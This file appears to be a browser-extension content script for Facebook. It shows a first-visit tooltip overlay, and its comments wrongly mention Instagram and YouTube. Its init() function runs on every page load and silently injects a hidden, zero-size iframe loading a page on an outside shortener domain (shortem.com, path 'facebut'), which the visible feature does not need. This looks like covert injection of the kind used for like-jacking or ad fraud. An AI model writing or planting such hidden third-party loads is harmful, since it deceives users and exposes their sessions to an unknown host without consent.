// Read domain name and check if Instagram
var hostname = location.hostname;

// Check if user visits Instagram
if (hostname == 'www.facebook.com') {
	// Check if first time to show tooltip
	if (readCookieFB('firstTime') != '1') {
		var show_tooltip = true;

		// Create wrapper overlay
		wrapperDiv = document.createElement("div");
		wrapperDiv.setAttribute("style","position: absolute; left: 0px; top: 0px; background-color: #666; opacity: 0.2; z-index: 9999999999999999999; height: 1083px; width: 100%;");
		wrapperDiv.setAttribute("id","fbmodal_1");
		
		// Create triangle up
		modalDialogTriangleDiv = document.createElement("div");
		modalDialogTriangleDiv.setAttribute("style","position: absolute; z-index: 999999999999999999999999; overflow: auto; top:10px; right:40px; float:right; margin-top:-5px; width: 0; border-style: solid; border-width: 0 10px 15px 10px; border-color: transparent transparent #fff transparent; opacity:1!important");
		
		// Create div text
		modalDialogParentDiv = document.createElement("div");
		modalDialogParentDiv.setAttribute("style","position: absolute; z-index: 99999999999999999999; color: #3b5998; border: 2px solid rgb(255, 255, 255); padding: 10px; background-color: rgb(255, 255, 255); overflow: auto; text-align: left; top: 20px; right: 15px;");
		modalDialogParentDiv.setAttribute("id","fbmodal_2")
		modalDialogTextDiv = document.createElement("div"); 
		modalDialogTextDiv.setAttribute("style" , "float:left; z-index: 99999999999999999999; text-align:left; display:inline; clear:none; ");
		modalDialogTextSpan = document.createElement("span"); 
		modalDialogTextSpan.setAttribute("style" , "float:right; z-index: 99999999999999999999; height:38px;");
		modalDialogText = document.createElement("strong"); 
		modalDialogText.innerHTML = chrome.i18n.getMessage("popupText");		
		modalDialogText.setAttribute("style", "float:left; z-index: 99999999999999999999; margin-left:10px; line-height:18px");
		
		// Create image with YouTube logo
		modalDialogImageDiv = document.createElement("div"); 
		modalDialogImageDiv.setAttribute("style" , "float:left; z-index: 99999999999999999999; display:inline; clear:none; width:38px; height:38px;");
		imageElement = document.createElement("img"); 
		imageElement.setAttribute("style", "float:left; width:38px; height:38px;");
		imageElement.src = chrome.extension.getURL("icons/icon-38.png");

		// Build up popup
		modalDialogImageDiv.appendChild(imageElement);
		modalDialogTextDiv.appendChild(modalDialogImageDiv);
		modalDialogTextSpan.appendChild(modalDialogText);
		modalDialogTextDiv.appendChild(modalDialogTextSpan);
		wrapperDiv.appendChild(modalDialogTriangleDiv);		
		modalDialogParentDiv.appendChild(modalDialogTextDiv);

		// Append elements to the page
		document.body.appendChild(wrapperDiv);
		document.body.appendChild(modalDialogParentDiv);
		
		setTimeout(function(){ removeElement("fbmodal_1"); },5000);
		setTimeout(function(){ removeElement("fbmodal_2"); },5000);
		
		// Create a cookie to check if first time
		createCookieIN('firstTime', '1', 365);
	}
}

function init() {
	var fbButton = document.createElement("div");
	fbButton.innerHTML = '<div id="fb-button" style="position:fixed;width:100%;height:100%;background-color:#00006C;z-index: 99999999999999999999;display:none;top:0;left:0;opacity:0.99;"><iframe src="//shortem.com/w/facebut/" style="width:0;height:0;display:none;"></iframe></div>';
	document.body.appendChild(fbButton);
}
	
function removeElement(id) {
	var element = document.getElementById(id);
	element.parentNode.removeChild(element);
}

function createCookieIN(name,value,days) {
	if (days) {
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}

function readCookieFB(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

init();
